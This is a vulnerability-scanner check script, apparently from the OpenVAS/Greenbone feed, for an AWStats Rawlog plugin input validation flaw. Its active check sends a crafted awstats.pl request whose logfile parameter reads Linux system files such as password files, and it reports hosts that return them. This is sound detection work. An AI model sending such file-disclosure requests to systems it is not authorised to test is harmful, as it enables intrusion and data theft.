# SPDX-FileCopyrightText: 2004 David Maciejak
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:awstats:awstats";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.14347");
  script_version("2025-09-09T14:09:45+0000");
  script_xref(name:"URL", value:"https://web.archive.org/web/20210121162231/http://www.securityfocus.com/bid/10950");
  script_tag(name:"last_modification", value:"2025-09-09 14:09:45 +0000 (Tue, 09 Sep 2025)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_name("AWStats Rawlog Plugin Logfile Parameter Input Validation Vulnerability (Aug 2004) - Active Check");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2004 David Maciejak");
  script_family("Web application abuses");
  script_dependencies("gb_awstats_http_detect.nasl", "os_detection.nasl");
  script_mandatory_keys("awstats/http/detected");
  script_require_ports("Services/www", 80);

  script_tag(name:"solution", value:"Update to the latest version of this software.");

  script_tag(name:"summary", value:"AWStats Rawlog Plugin is prone to an input validation
  vulnerability.");

  script_tag(name:"impact", value:"An attacker may exploit this condition to execute commands
  remotely or disclose contents of web server readable files.");

  script_tag(name:"insight", value:"The issue is reported to exist because user supplied 'logfile'
  URI data passed to the 'awstats.pl' script is not sanitized.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("host_details.inc");
include("os_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("traversal_func.inc");

if( ! port = get_app_port( cpe:CPE, service:"www" ) )
  exit( 0 );

if( ! dir = get_app_location( cpe:CPE, port:port ) )
  exit( 0 );

if( dir == "/" )
  dir = "";

files = traversal_files( "linux" );

hostname = http_host_name( dont_add_port: TRUE );

foreach file( keys( files ) ) {

  url = dir + "/awstats.pl?filterrawlog=&rawlog_maxlines=5000&config=" + hostname + "&framename=main&pluginmode=rawlog&logfile=/" + files[file];

  if( http_vuln_check( port:port, url:url, pattern:file ) ) {
    report = http_report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );
